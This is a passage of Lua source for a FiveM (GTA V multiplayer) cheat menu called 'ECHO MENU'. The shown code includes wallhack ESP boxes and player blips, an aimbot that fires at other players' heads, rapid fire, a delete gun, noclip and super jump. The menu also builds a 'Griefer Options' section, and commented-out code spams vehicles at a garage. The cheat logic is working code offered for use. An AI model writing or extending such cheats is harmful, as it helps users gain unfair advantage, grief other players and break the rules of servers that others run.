						LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

						TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

						ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						DrawLine(LineOneBegin.x, LineOneBegin.y, LineOneBegin.z, LineOneEnd.x, LineOneEnd.y, LineOneEnd.z, 50, 80, 150, 255)
						DrawLine(LineTwoBegin.x, LineTwoBegin.y, LineTwoBegin.z, LineTwoEnd.x, LineTwoEnd.y, LineTwoEnd.z, 50, 80, 150, 255)
						DrawLine(LineThreeBegin.x, LineThreeBegin.y, LineThreeBegin.z, LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, 50, 80, 150, 255)
						DrawLine(LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, LineFourBegin.x, LineFourBegin.y, LineFourBegin.z, 50, 80, 150, 255)
						DrawLine(TLineOneBegin.x, TLineOneBegin.y, TLineOneBegin.z, TLineOneEnd.x, TLineOneEnd.y, TLineOneEnd.z, 50, 80, 150, 255)
						DrawLine(TLineTwoBegin.x, TLineTwoBegin.y, TLineTwoBegin.z, TLineTwoEnd.x, TLineTwoEnd.y, TLineTwoEnd.z, 50, 80, 150, 255)
						DrawLine(TLineThreeBegin.x, TLineThreeBegin.y, TLineThreeBegin.z, TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, 50, 80, 150, 255)
						DrawLine(TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, TLineFourBegin.x, TLineFourBegin.y, TLineFourBegin.z, 50, 80, 150, 255)
						DrawLine(ConnectorOneBegin.x, ConnectorOneBegin.y, ConnectorOneBegin.z, ConnectorOneEnd.x, ConnectorOneEnd.y, ConnectorOneEnd.z, 50, 80, 150, 255)
						DrawLine(ConnectorTwoBegin.x, ConnectorTwoBegin.y, ConnectorTwoBegin.z, ConnectorTwoEnd.x, ConnectorTwoEnd.y, ConnectorTwoEnd.z, 50, 80, 150, 255)
						DrawLine(ConnectorThreeBegin.x, ConnectorThreeBegin.y, ConnectorThreeBegin.z, ConnectorThreeEnd.x, ConnectorThreeEnd.y, ConnectorThreeEnd.z, 50, 80, 150, 255)
						DrawLine(ConnectorFourBegin.x, ConnectorFourBegin.y, ConnectorFourBegin.z, ConnectorFourEnd.x, ConnectorFourEnd.y, ConnectorFourEnd.z, 50, 80, 150, 255)
					end
					if Line_ESP then DrawLine(cx, cy, cz, x, y, z, 50, 80, 150, 255) end
				end
			end
		end

		--TaskWanderStandard(PlayerPedId(), 0, 0)
		--DoScreenFadeIn(500)

		if playerBlips then
			-- show blips
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				local ped = GetPlayerPed(id)
				if ped ~= PlayerPedId() then
					local blip = GetBlipFromEntity(ped)
		
					-- HEAD DISPLAY STUFF --
		
					-- Create head display (this is safe to be spammed)
					-- headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )
		
					-- Speaking display
					-- I need to move this over to name tag code
					-- if NetworkIsPlayerTalking(id) then
					-- 	Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, true ) -- Add speaking sprite
					-- else
					-- 	Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false ) -- Remove speaking sprite
					-- end
		
					-- BLIP STUFF --
		
					if not DoesBlipExist(blip) then -- Add blip and create head display on player
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
					else -- update blip
						local veh = GetVehiclePedIsIn(ped, false)
						local blipSprite = GetBlipSprite(blip)
		
						if GetEntityHealth(ped) == 0 then -- dead
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
							end
						elseif veh then
							local vehClass = GetVehicleClass(veh)
							local vehModel = GetEntityModel(veh)
							if vehClass == 15 then -- Helicopters
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 8 then -- Motorcycles
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 16 then -- Plane
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 14 then -- Boat
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("rhino") then -- Tank
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("pbus") then -- Prison Bus
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
							end
		
							-- Show number in case of passangers
							local passengers = GetVehicleNumberOfPassengers(veh)
		
							if passengers > 0 then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							-- Remove leftover number
							HideNumberOnBlip(blip)
		
							if blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
		
							end
						end
		
						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
						SetBlipNameToPlayerName(blip, id) -- update blip name
						SetBlipScale(blip,  0.85) -- set scale
		
						-- set player alpha
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot
		
							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		elseif not playerBlips then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				local ped = GetPlayerPed(id)
				local blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then -- Removes blip
					RemoveBlip(blip)
				end
			end
		
		end

	takytemamrad.BuduSeToDelatMRDKO = function()
	takytemamrad.SendNotification({text = "Slap my Ass I have to finish it", type = "error"})
	end


--[[if ShowMyFPS then
	takytemamrad.SendNotification({text = "Slap my Ass", type = "error"})
end]]

	--[[function displayText(text, justification, red, green, blue, alpha, posx, posy)
		SetTextFont(4)
		SetTextWrap(0.0, 1.0)
		SetTextScale(1.0, 0.5)
		SetTextJustification(justification)
		SetTextColour(red, green, blue, alpha)
		SetTextOutline()
	
		BeginTextCommandDisplayText("STRING")
		AddTextComponentSubstringPlayerName(text)
		EndTextCommandDisplayText(posx, posy)
	end
	
	local prevframes, prevtime, curtime, curframes, fps = 0, 0, 0, 0, 0
	
	Citizen.CreateThread(function()
		--
		while not NetworkIsPlayerActive(PlayerId()) or not NetworkIsSessionStarted() do
			Citizen.Wait(0)
			prevframes = GetFrameCount()
			prevtime = GetGameTimer()
		end
		while true do
			Citizen.Wait(10)
			curtime = GetGameTimer()
			curframes = GetFrameCount()
	
			if (curtime - prevtime) > 1000 then
				fps = (curframes - prevframes) - 1              
				prevtime = curtime
				prevframes = curframes
			end
	
			if useColors then
				if fps > 0 and fps < 12 then
					displayText("~s~FPS: ~r~" .. fps, 0, 255, 255, 255, 255, 0.5, 0.0)
				elseif fps > 0 and fps < 30 then
					displayText("~s~FPS: ~o~" .. fps, 0, 255, 255, 255, 255, 0.5, 0.0)
				elseif fps > 0 and fps < 1000 then
					displayText("~s~FPS: ~g~" .. fps, 0, 255, 255, 255, 255, 0.5, 0.0)
				end
			else
				if fps > 0 and fps < 1000 then
					displayText("~s~FPS: " .. fps, 0, 255, 255, 255, 255, 0.5, 0.0)
				end
			end
		end
	end)
end]]


if Cya.Toggle.VehicleCollision then
	playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
	for k in EnumerateVehicles() do
		SetEntityNoCollisionEntity(k, playerveh, true)
	end
	for k in EnumerateObjects() do
		SetEntityNoCollisionEntity(k, playerveh, true)
	end
	for k in EnumeratePeds() do
		SetEntityNoCollisionEntity(k, playerveh, true)
	end
end


if Cya.Toggle.EasyHandling then
	if Cya.Player.Vehicle ~= 0 then
		SetVehicleGravityAmount(Cya.Player.Vehicle, 30.0)
	end
else
	if Cya.Player.Vehicle ~= 0 then
		SetVehicleGravityAmount(Cya.Player.Vehicle, 9.8)
	end
end

	SetRunSprintMultiplierForPlayer(PlayerId(), SliderOptions.FastRun.Values[SliderOptions.FastRun.Selected])
	SetPedMoveRateOverride(PlayerPedId(), SliderOptions.FastRun.Values[SliderOptions.FastRun.Selected])

		if ForceThirdPerson then
			SetFollowPedCamViewMode(0)
			SetFollowVehicleCamViewMode(0)
		end		

		if FlashMode then
			SetSuperJumpThisFrame(PlayerId(), 1.4)
			SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
			SetPedMoveRateOverride(PlayerId(), 10)
			RequestNamedPtfxAsset("core")
			UseParticleFxAssetNextCall("core")
			StartNetworkedParticleFxNonLoopedOnEntity(
				"ent_sht_electrical_box",
				PlayerPedId(),
				0,
				0,
				-0.5,
				0,
				0,
				0,
				1,
				false,
				false,
				false
			)
		end

		if FreezeAll then
		for i = 0, 1024 do
			if NetworkIsPlayerTalking(i) then
			SetRunSprintMultiplierForPlayer(GetPlayerServerId(i), 5)
			SetPedMoveRateOverride(GetPlayerServerId(i), 5)
			SetSuperJumpThisFrame(GetPlayerServerId(i), 2.5)
			SetPlayerInvincible(GetPlayerServerId(i))
			SetEntityInvincible(GetPlayerServerId(-1))
			SetEntityProofs(GetPlayerServerId(i))
			end               
		end
	end

		if SuperJump then
			SetSuperJumpThisFrame(PlayerId())
		end

		if ShowCoords then
            local pos = GetEntityCoords(PlayerPedId())
            DrawTxt('<font color="#4280C6"X: ~w~' .. round(pos.x, 3), 0.38, 0.03, 0.0, 0.4)
            DrawTxt('<font color="#4280C6"Y: ~w~' .. round(pos.y, 3), 0.45, 0.03, 0.0, 0.4)
            DrawTxt('<font color="#4280C6"Z: ~w~' .. round(pos.z, 3), 0.52, 0.03, 0.0, 0.4)
        end

		if Crosshair then
			EnableCrosshairThisFrame()
			ShowHudComponentThisFrame(14)
		end
		
		if Crosshair1 then
			RequestStreamedTextureDict("darts")
			DrawSprite("darts", "dart_reticules", 0.5, 0.5, 0.01, 0.02, 0.0, 255, 255, 255, 255) -- rgb(26, 188, 156) a = 255
		end

		if XMAS then
		SetForceVehicleTrails(true)
        SetForcePedFootstepsTracks(true)
		SetWeatherTypePersist("XMAS")
        SetWeatherTypeNowPersist("XMAS")
        SetWeatherTypeNow("XMAS")
		SetOverrideWeather("XMAS")
		end

		if BLIZZARD then
		SetWeatherTypePersist("BLIZZARD")
		SetWeatherTypeNowPersist("BLIZZARD")
		SetWeatherTypeNow("BLIZZARD")
		SetOverrideWeather("BLIZZARD")
		end		

		if FOGGY then
		SetWeatherTypePersist("FOGGY")
		SetWeatherTypeNowPersist("FOGGY")
		SetWeatherTypeNow("FOGGY")
		SetOverrideWeather("FOGGY")
		end		

		if EXTRASUNNY then
		SetWeatherTypePersist("EXTRASUNNY")
		SetWeatherTypeNowPersist("EXTRASUNNY")
		SetWeatherTypeNow("EXTRASUNNY")
		SetOverrideWeather("EXTRASUNNY")
		end

		if CLEAR then
		SetWeatherTypePersist("CLEAR")
		SetWeatherTypeNowPersist("CLEAR")
		SetWeatherTypeNow("CLEAR")
		SetOverrideWeather("CLEAR")
		end

		if THUNDER then
		SetWeatherTypePersist("THUNDER")
		SetWeatherTypeNowPersist("THUNDER")
		SetWeatherTypeNow("THUNDER")
		SetOverrideWeather("THUNDER")
		end
		
		if ResetWeather then
			SetWeatherTypePersist("EXTRASUNNY")
			SetWeatherTypeNowPersist("EXTRASUNNY")
			SetWeatherTypeNow("EXTRASUNNY")
			SetOverrideWeather("EXTRASUNNY")
		end
		--[[if showNametags then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				if GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then
					local ped = GetPlayerPed( id )
					--blip = GetBlipFromEntity( ped )

					local x1, y1, z1 = table.unpack( GetEntityCoords(PlayerPedId(), true) )
					local x2, y2, z2 = table.unpack( GetEntityCoords(GetPlayerPed(id), true) )
					local distance = math.round(#(vector3(x1, y1, z1) - vector3(x2, y2, z2)), 1)

					if distance < 125 then
						if NetworkIsPlayerTalking(id) then
							DrawText3D(x2, y2, z2 + 1.25, '~b~[ ~s~' .. GetPlayerServerId(id) .. '~b~ ] ~s~| ~b~[ ~s~' .. GetPlayerName(id) .. "~b~ ]\nTALKING", 0, 100, 255)
						else
							DrawText3D(x2, y2, z2 + 1.25, '~b~[ ~s~' .. GetPlayerServerId(id) .. '~b~ ] ~s~| ~b~[ ~s~' .. GetPlayerName(id) .. "~b~ ]", 255, 255, 255)
						end
					end
				end
			end
		end

		if showNametags2 then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				if GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then
					local ped = GetPlayerPed( id )
					--blip = GetBlipFromEntity( ped )

					local x1, y1, z1 = table.unpack( GetEntityCoords(PlayerPedId(), true) )
					local x2, y2, z2 = table.unpack( GetEntityCoords(GetPlayerPed(id), true) )
					local distance = math.round(#(vector3(x1, y1, z1) - vector3(x2, y2, z2)), 1)

					if distance < 125 then
						if NetworkIsPlayerTalking(id) then
							DrawText3D(x2, y2, z2 + 1.25, '~s~' .. GetPlayerServerId(id) .. '~s~ | ~s~' .. GetPlayerName(id) .. "\nTALKING", 21, 76, 195)
						else
							DrawText3D(x2, y2, z2 + 1.25, '~s~' .. GetPlayerServerId(id) .. '~s~ | ~s~' .. GetPlayerName(id) .. "", 255, 255, 255)
						end
					end
				end
			end
		end]]

		if Nametagy then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				if GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then
					local ped = GetPlayerPed( id )

					local x1, y1, z1 = table.unpack( GetEntityCoords(PlayerPedId(), true) )
					local x2, y2, z2 = table.unpack( GetEntityCoords(GetPlayerPed(id), true) )
					local distance = math.round(#(vector3(x1, y1, z1) - vector3(x2, y2, z2)), 1)

					if distance < 125 then
                        if NetworkIsPlayerTalking(id) then
                            DrawText3D(x2, y2, z2 + 1.25, '~w~[~g~Talking~w~] ~w~'.. GetPlayerName(id) ..' ~b~[~w~'.. GetPlayerServerId(id) ..'~b~]')
                        else
                            DrawText3D(x2, y2, z2 + 1.25, '~w~[~r~Not talking~w~] ~w~'.. GetPlayerName(id) ..' ~b~[~w~'.. GetPlayerServerId(id) ..'~b~]')
                        end
                    end
                end
            end
		end
		
		local function runAimbot()
			if IsControlJustReleased(0, 24) then
			for i = 0, 256 do
				if i ~= PlayerId() then
					if IsPlayerFreeAiming(PlayerId()) then
						local TargetPed = GetPlayerPed(i)
						local TargetPos = GetEntityCoords(TargetPed)
						local Exist = DoesEntityExist(TargetPed)
						local Visible = IsEntityVisible(TargetPed)
						local Dead = IsPlayerDead(TargetPed)

						if GetEntityHealth(TargetPed) <= 0 then
							Dead = true
						end

						if Exist and not Dead then
							if Visible then
								local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
								if OnScreen then
									if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
											local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
											local TargetHeading = GetEntityHeading(TargetPed)
																				if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
										local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
										local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), TargetPed)
										if not Aiming then
											DrawMarker(28, TargetCoords.x, TargetCoords.y, TargetCoords.z + 0.05, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.14, 0.14, 0.14, 0, 255, 0, 255, false, true, 2, nil, nil, false)
										elseif Aiming then
											DrawMarker(28, TargetCoords.x, TargetCoords.y, TargetCoords.z + 0.05, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.14, 0.14, 0.14, 255, 0, 0, 255, false, true, 2, nil, nil, false)
											SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
										end
									end
								end
							end
						end
					end
				end
			end
		end
	end
end
		
		if weaponsAimbotT then
			runAimbot()
		end		

		if HVH then
			for i = 0, 256 do
				if i ~= PlayerId() and i ~= -1 then
					if IsPlayerFreeAiming(PlayerId()) then
						local TargetPed = GetPlayerPed(i)
						local TargetPos = GetEntityCoords(TargetPed)
						local Exist = DoesEntityExist(TargetPed)
						local Visible = IsEntityVisible(TargetPed)
						local Dead = IsPlayerDead(TargetPed)

						local Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)

						if GetEntityHealth(TargetPed) <= 0 then
							Dead = true
						end

						if Exist and not Dead then
							if Visible then
								local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
								if OnScreen then
									if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
										local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
										local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), TargetPed)
										if not Aiming then
											DrawMarker(28, TargetCoords.x, TargetCoords.y, TargetCoords.z + 0.05, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.14, 0.14, 0.14, 0, 255, 0, 255, false, true, 2, nil, nil, false)
										elseif Aiming then
											DrawMarker(28, TargetCoords.x, TargetCoords.y, TargetCoords.z + 0.05, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.14, 0.14, 0.14, 255, 0, 0, 255, false, true, 2, nil, nil, false)
											--DrawMarker(1, EntityCoords, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 255, 0, 255, false, false, 2, nil, nil, false)
											--DrawMarker(1, TargetCoords.x, TargetCoords.y, TargetCoords.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 1.0, 1.0, 0, 255, 0, 100, false, false, 2, 0, nil, nil, false)
											SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, true)
										end
									end
								end
							end
						end
					end
				end
			end
		end

		--[[local function SpamnNaHlavniGaraze()                                                                    
			local AutaPropEntity = GetHashKey("blista")
			RequestModel(AutaPropEntity)
			local AutaPropEntitySpam = CreateObject(AutaPropEntity, 230.13, -779.78, 44.2, true, true, false)
			local AutaPropEntitySpam = CreateObject(AutaPropEntity, 230.13, -779.78, 44.2, true, true, false)
			ActivatePhysics(AutaPropEntitySpam)
		end	

		if GarageSpam then 
			SpamnNaHlavniGaraze()
		end]]	


		if Cya.Toggle.RapidFire then
			DisablePlayerFiring(PlayerPedId(), true)
			if IsDisabledControlPressed(0, Cya.Keys["MOUSE1"]) then
				local _, weapon = GetCurrentPedWeapon(PlayerPedId())
				local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
				local camDir = GetCamDirFromScreenCenter()
				local camPos = GetGameplayCamCoord()
				local launchPos = GetEntityCoords(wepent)
				local targetPos = camPos + (camDir * 200.0)
				
				ClearAreaOfProjectiles(launchPos, 0.0, 1)
				
				ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
				ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
			end
		end
		
		if Cya.Toggle.DeleteGun then
			local found, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
			if found then
				local entityCoords = GetEntityCoords(entity)
				DrawMarker(2, entityCoords.x, entityCoords.y, entityCoords.z + 2, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 2.0, 2.0, 2.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 170, false, true, 2, nil, nil, false)
				if IsDisabledControlPressed(0, Cya.Keys["MOUSE1"]) then
					SetEntityAsMissionEntity(entity)
					DeleteEntity(entity)
				end
			end
		end

		if Cya.Player.isNoclipping then
			local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
			local k = nil
			local x, y, z = nil
			
			if not isInVehicle then
				k = PlayerPedId()
				x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
			else
				k = GetVehiclePedIsIn(PlayerPedId(), 0)
				x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
			end
			
			if isInVehicle and Cya.Hra:GetSeatPedIsIn(PlayerPedId()) ~= -1 then Cya.Hra:RequestControlOnce(k) end
			
			local dx, dy, dz = Cya.Hra:GetCamDirection()
			SetEntityVisible(PlayerPedId(), 0, 0)
			SetEntityVisible(k, 0, 0)
			
			SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
			
			if IsDisabledControlJustPressed(0, Cya.Keys["LEFTSHIFT"]) then -- Change speed
				oldSpeed = NoclipSpeed
				NoclipSpeed = NoclipSpeed * 5
			end
			
			if IsDisabledControlJustReleased(0, Cya.Keys["LEFTSHIFT"]) then -- Restore speed
				NoclipSpeed = oldSpeed
			end
			
			if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
				x = x + NoclipSpeed * dx
				y = y + NoclipSpeed * dy
				z = z + NoclipSpeed * dz
			end
			
			if IsDisabledControlPressed(0, 269) then -- MOVE BACK
				x = x - NoclipSpeed * dx
				y = y - NoclipSpeed * dy
				z = z - NoclipSpeed * dz
			end
			
			if IsDisabledControlPressed(0, Cya.Keys["SPACE"]) then -- MOVE UP
				z = z + NoclipSpeed
			end
			
			if IsDisabledControlPressed(0, Cya.Keys["LEFTCTRL"]) then -- MOVE DOWN
				z = z - NoclipSpeed
			end
			
			SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
		end
		Citizen.Wait(0)
	end
end
CreateThread(MenuToggleThread)


-- Menu runtime for drawing and handling input
local function MenuRuntimeThread()
	FreezeEntityPosition(entity, false)
	local currentItemIndex = 1
	local selectedItemIndex = 1
	-- MAIN MENU
	if isMenuEnabled then
		takytemamrad.CreateMenu("takytemamradMainMenu", "ECHO MENU")
		takytemamrad.SetSubTitle("takytemamradMainMenu", "ECHO MENU") -- Hlavni Menu

	-- MAIN MENU CATEGORIES
		takytemamrad.CreateSubMenu("SelfMenu", "takytemamradMainMenu", "Self Options")
		takytemamrad.CreateSubMenu("SelfSuperPowers", "SelfMenu", "Super Powers")
		takytemamrad.CreateSubMenu("SelfPlayerOptions", "SelfMenu", "Player Options") 
		takytemamrad.CreateSubMenu('OnlinePlayersMenu', 'takytemamradMainMenu', "Online Options")
		takytemamrad.CreateSubMenu("VisualMenu", "takytemamradMainMenu", "Visual Options")
		takytemamrad.CreateSubMenu("LocalWepMenu", "takytemamradMainMenu", "Weapon Options")
		takytemamrad.CreateSubMenu("LocalVehicleMenu", "takytemamradMainMenu", "Vehicles Options")
		takytemamrad.CreateSubMenu("GriefMenu", "takytemamradMainMenu", "Griefer Options")
		takytemamrad.CreateSubMenu("ServerMenu", "takytemamradMainMenu", "Server Options")
		takytemamrad.CreateSubMenu("MenuSettings", "takytemamradMainMenu", "Menu Settings")

		-- Teleport Menu
		takytemamrad.CreateSubMenu("TeleportMenu", "takytemamradMainMenu", "Teleport Options")
        takytemamrad.CreateSubMenu("ClothingStores", "TeleportMenu", "Clothing Stores")
        takytemamrad.CreateSubMenu("BarberShops", "TeleportMenu", "Barbery Shops")
        takytemamrad.CreateSubMenu("Airports", "TeleportMenu", "Airports")
        takytemamrad.CreateSubMenu("Garages", "TeleportMenu", "Garages and stuff")
        takytemamrad.CreateSubMenu("Ammunation", "TeleportMenu", "Weapon Shops")
		takytemamrad.CreateSubMenu("Cinemas", "TeleportMenu", "Cinemas")
		takytemamrad.CreateSubMenu("Clubs", "TeleportMenu", "Clubs")

	-- Los Santos Customs
		takytemamrad.CreateSubMenu('LSC', 'LocalVehicleMenu', "Los Santos Customs")
		takytemamrad.CreateSubMenu('lsc_bodywork', 'LSC', 'Bodywork')
		takytemamrad.CreateSubMenu('lsc_performance', 'LSC', 'Performance Tuning')

		-- MAIN MENU > Vehicle Options
		takytemamrad.CreateSubMenu("LocalVehicleMenu", "CyaMainMenu", "Vehicle Options")
		-- MAIN MENU > Vehicle Options > Vehicle Spawner
		takytemamrad.CreateSubMenu("LocalVehicleSpawner", "LocalVehicleMenu", "Vehicle Spawner")
		-- MAIN MENU > Vehicle Options > Vehicle Spawner > $class
		takytemamrad.CreateSubMenu("localcompacts", "LocalVehicleSpawner", "Compacts")
